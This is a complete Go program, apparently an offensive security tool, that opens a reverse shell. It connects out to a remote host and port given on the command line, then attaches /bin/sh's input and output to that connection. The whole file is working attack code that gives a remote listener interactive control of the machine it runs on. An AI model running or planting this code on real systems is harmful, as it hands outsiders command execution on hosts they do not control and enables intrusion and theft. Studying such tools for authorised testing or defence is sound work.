// Call back to a remote server and open a shell session
package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

var shell = "/bin/sh"

func main() {
	// Handle command line arguments
	if len(os.Args) < 2 {
		fmt.Println("Usage: " + os.Args[0] + " <remoteAddress>")
		fmt.Println("Example: " + os.Args[0] + " 192.168.0.27:9999")
		os.Exit(1)
	}

	// Connect to remote listener
	remoteConn, err := net.Dial("tcp", os.Args[1])
	if err != nil {
		log.Fatal("Error connecting. ", err)
	}
	log.Println("Connection established. Launching shell.")

	command := exec.Command(shell)
	// Take advantage of reader/writer interfaces to tie inputs/outputs
	command.Stdin = remoteConn
	command.Stdout = remoteConn
	command.Stderr = remoteConn
	command.Run()
}
